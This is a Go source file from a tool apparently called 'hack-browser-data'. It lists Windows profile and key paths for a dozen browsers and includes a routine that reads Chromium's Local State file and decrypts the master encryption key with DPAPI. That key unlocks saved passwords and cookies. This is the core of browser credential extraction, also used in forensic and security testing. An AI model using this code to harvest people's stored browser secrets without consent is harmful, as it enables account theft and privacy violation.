package core

import (
	"encoding/base64"
	"errors"
	"fmt"
	"os"

	"hack-browser-data/core/decrypt"
	"hack-browser-data/utils"

	"github.com/tidwall/gjson"
)

const (
	chromeProfilePath     = "/AppData/Local/Google/Chrome/User Data/*/"
	chromeKeyPath         = "/AppData/Local/Google/Chrome/User Data/Local State"
	chromeBetaProfilePath = "/AppData/Local/Google/Chrome Beta/User Data/*/"
	chromeBetaKeyPath     = "/AppData/Local/Google/Chrome Beta/User Data/Local State"
	chromiumProfilePath   = "/AppData/Local/Chromium/User Data/*/"
	chromiumKeyPath       = "/AppData/Local/Chromium/User Data/Local State"
	edgeProfilePath       = "/AppData/Local/Microsoft/Edge/User Data/*/"
	edgeKeyPath           = "/AppData/Local/Microsoft/Edge/User Data/Local State"
	braveProfilePath      = "/AppData/Local/BraveSoftware/Brave-Browser/User Data/*/"
	braveKeyPath          = "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State"
	speed360ProfilePath   = "/AppData/Local/360chrome/Chrome/User Data/*/"
	qqBrowserProfilePath  = "/AppData/Local/Tencent/QQBrowser/User Data/*/"
	firefoxProfilePath    = "/AppData/Roaming/Mozilla/Firefox/Profiles/*.default*/"
	operaProfilePath      = "/AppData/Roaming/Opera Software/Opera Stable/"
	operaKeyPath          = "/AppData/Roaming/Opera Software/Opera Stable/Local State"
	operaGXProfilePath    = "/AppData/Roaming/Opera Software/Opera GX Stable/"
	operaGXKeyPath        = "/AppData/Roaming/Opera Software/Opera GX Stable/Local State"
	vivaldiProfilePath    = "/AppData/Local/Vivaldi/User Data/Default/"
	vivaldiKeyPath        = "/AppData/Local/Vivaldi/Local State"
)

var (
	browserList = map[string]struct {
		ProfilePath string
		Name        string
		KeyPath     string
		Storage     string
		New         func(profile, key, name, storage string) (Browser, error)
	}{
		"chrome": {
			ProfilePath: os.Getenv("USERPROFILE") + chromeProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + chromeKeyPath,
			Name:        chromeName,
			New:         NewChromium,
		},
		"chrome-beta": {
			ProfilePath: os.Getenv("USERPROFILE") + chromeBetaProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + chromeBetaKeyPath,
			Name:        chromeBetaName,
			New:         NewChromium,
		},
		"chromium": {
			ProfilePath: os.Getenv("USERPROFILE") + chromiumProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + chromiumKeyPath,
			Name:        chromiumName,
			New:         NewChromium,
		},
		"edge": {
			ProfilePath: os.Getenv("USERPROFILE") + edgeProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + edgeKeyPath,
			Name:        edgeName,
			New:         NewChromium,
		},
		"360": {
			ProfilePath: os.Getenv("USERPROFILE") + speed360ProfilePath,
			Name:        speed360Name,
			New:         NewChromium,
		},
		"qq": {
			ProfilePath: os.Getenv("USERPROFILE") + qqBrowserProfilePath,
			Name:        qqBrowserName,
			New:         NewChromium,
		},
		"firefox": {
			ProfilePath: os.Getenv("USERPROFILE") + firefoxProfilePath,
			Name:        firefoxName,
			New:         NewFirefox,
		},
		"brave": {
			ProfilePath: os.Getenv("USERPROFILE") + braveProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + braveKeyPath,
			Name:        braveName,
			New:         NewChromium,
		},
		"opera": {
			ProfilePath: os.Getenv("USERPROFILE") + operaProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + operaKeyPath,
			Name:        operaName,
			New:         NewChromium,
		},
		"opera-gx": {
			ProfilePath: os.Getenv("USERPROFILE") + operaGXProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + operaGXKeyPath,
			Name:        operaGXName,
			New:         NewChromium,
		},
		"vivaldi": {
			ProfilePath: os.Getenv("USERPROFILE") + vivaldiProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + vivaldiKeyPath,
			Name:        vivaldiName,
			New:         NewChromium,
		},
	}
)

var (
	errBase64DecodeFailed = errors.New("decode base64 failed")
)

// InitSecretKey with win32 DPAPI
// conference from @https://gist.github.com/akamajoris/ed2f14d817d5514e7548
func (c *Chromium) InitSecretKey() error {
	if c.keyPath == "" {
		return nil
	}
	if _, err := os.Stat(c.keyPath); os.IsNotExist(err) {
		return fmt.Errorf("%s secret key path is empty", c.name)
	}
	keyFile, err := utils.ReadFile(c.keyPath)
	if err != nil {
		return err
	}
	encryptedKey := gjson.Get(keyFile, "os_crypt.encrypted_key")
	if encryptedKey.Exists() {
		pureKey, err := base64.StdEncoding.DecodeString(encryptedKey.String())
		if err != nil {
			return errBase64DecodeFailed
		}
		c.secretKey, err = decrypt.DPApi(pureKey[5:])
		return err
	}
	return nil
}
